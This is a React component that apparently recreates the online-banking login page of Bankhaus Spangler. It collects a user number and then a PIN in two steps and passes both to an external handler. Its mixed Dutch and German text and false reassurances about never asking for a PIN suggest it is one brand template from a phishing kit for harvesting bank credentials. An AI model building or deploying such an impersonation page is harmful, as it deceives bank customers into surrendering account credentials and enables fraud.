"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function BankhausSpangler({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen font-sans flex flex-col items-center justify-center relative px-4">
      {/* Background Lounge Image */}
      <div 
        className="absolute inset-0 -z-10"
        style={{
          backgroundImage: "url('/spangler-bg.webp')",
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundColor: "#f0f0f0"
        }}
      ></div>

      {/* Main Login Card */}
      <div className="w-full max-w-[620px] bg-white/95 backdrop-blur-sm shadow-[0_10px_30px_rgba(0,0,0,0.15)] flex flex-col mb-12">
        
        {/* Dark Blue Header */}
        <div className="bg-[#42618a] text-white px-6 py-4">
          <h1 className="text-[24px] font-normal tracking-wide">Login</h1>
        </div>

        <div className="p-6 md:p-8">
          
          {/* Intro Text */}
          <p className="text-[#333] text-[14px] leading-relaxed mb-6">
            Hier kunt u inloggen op uw internetbankieren. Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wij zullen u nooit om uw PIN of TAN vragen!
          </p>

          {/* Checkbox Demo Area */}
          <div className="flex items-start gap-3 mb-6 pb-6 border-b border-[#e5e5e5]">
            <div className="relative flex items-center justify-center shrink-0 mt-0.5">
              <input type="checkbox" id="demoMode" className="w-5 h-5 border border-[#b0b0b0] rounded-[2px] appearance-none bg-[#e8eaf0] cursor-pointer peer" />
              <svg className="absolute w-3.5 h-3.5 text-[#42618a] pointer-events-none hidden peer-checked:block" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <label htmlFor="demoMode" className="text-[#767676] text-[14px] leading-snug cursor-pointer">
              Möchten Sie sich die Demo-Version ansehen? In diesem Fall benötigen Sie keine Zugangsdaten.
            </label>
          </div>

          {/* Form Area */}
          <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col">
            
            <div className="flex justify-between items-end mb-1">
              <label className="text-[#888] text-[13px]">
                {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
              </label>
              <div className="text-[#998675] text-[13px]">
                <a href="#" className="hover:underline">Hochkontrast</a>
                <span className="text-[#b3b3b3] mx-1.5">|</span>
                <a href="#" className="hover:underline">English</a>
              </div>
            </div>

            <div className="mb-6">
              {step === 1 ? (
                <input 
                  type="text" 
                  required
                  autoFocus
                  value={formData.verfuegernummer || ""}
                  onChange={(e) => onChange("verfuegernummer", e.target.value)}
                  className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-white text-[#333] text-[15px] transition-colors"
                />
              ) : (
                <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                  <input 
                    type="password" 
                    required
                    autoFocus
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-white text-[#333] text-[15px] transition-colors"
                  />
                </div>
              )}
            </div>

            {/* Consent Text */}
            <p className="text-[#555] text-[13px] text-center leading-relaxed mb-6 px-4">
              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
            </p>

            {/* Action Buttons */}
            <button 
              type="submit" 
              disabled={saving}
              className="w-full bg-[#42618a] hover:bg-[#344d6e] text-white font-medium h-[44px] rounded-[3px] text-[15px] transition-colors disabled:opacity-70"
            >
              {saving ? "Wird geladen..." : "Weiter"}
            </button>

            {step === 2 && (
              <button 
                type="button" 
                onClick={() => setStep(1)}
                className="w-full mt-3 bg-white border border-[#42618a] hover:bg-blue-50 text-[#42618a] font-medium h-[44px] rounded-[3px] text-[15px] transition-colors"
              >
                Zurück
              </button>
            )}
          </form>

          {/* Footer Links inside card */}
          <div className="flex flex-col items-center gap-1.5 mt-8 border-b border-[#e5e5e5] pb-6 mb-6">
            <a href="#" className="text-[#998675] text-[14px] hover:underline">
              Gebruikersnaamn vergessen?
            </a>
            <a href="#" className="text-[#998675] text-[14px] hover:underline">
              Wachtwoord vergessen?
            </a>
          </div>

          {/* Live Hilfe Footer */}
          <div className="flex justify-center">
            <div className="flex items-center gap-1.5 cursor-pointer group">
              <div className="w-[18px] h-[18px] rounded-full border border-[#998675] text-[#998675] flex items-center justify-center font-serif text-[11px] group-hover:bg-[#998675] group-hover:text-white transition-colors">
                i
              </div>
              <a href="#" className="text-[#998675] text-[14px] group-hover:underline">
                Live Hilfe
              </a>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
